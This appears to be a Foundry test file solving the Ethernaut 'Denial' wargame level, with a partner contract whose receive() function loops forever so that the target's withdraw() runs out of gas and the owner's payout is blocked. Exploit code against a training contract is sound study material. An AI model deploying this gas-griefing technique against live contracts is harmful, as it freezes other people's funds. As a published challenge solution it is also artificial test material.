// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Denial.sol";


contract ExploitDenial {

    receive() external payable {
        // gas griefing attack
        while(true) {}
    }
}


contract TestDenial is Test {
    Denial denial;
    ExploitDenial exploitDenial;
    function setUp() external {
        exploitDenial = new ExploitDenial();
        denial = new Denial();
        vm.deal(address(denial), 1 ether);
    }

    function testExploit() external {
        // Check success before setting malicious partner
        address denial_owner = denial.owner();
        denial.setWithdrawPartner(address(0x51));
        uint256 balanceBeforeWithdraw = denial_owner.balance;
        (bool result, ) = address(denial).call{gas: 1000000}(abi.encodeWithSignature("withdraw()"));
        assertTrue(result);
        assertTrue(denial_owner.balance > balanceBeforeWithdraw);

        // Check failure after setting malicious partner
        denial.setWithdrawPartner(address(exploitDenial));
        balanceBeforeWithdraw = denial_owner.balance;
        (result, ) = address(denial).call{gas: 1000000}(abi.encodeWithSignature("withdraw()"));
        assertTrue(!result);
        assertEq(balanceBeforeWithdraw, denial_owner.balance);
    }
}
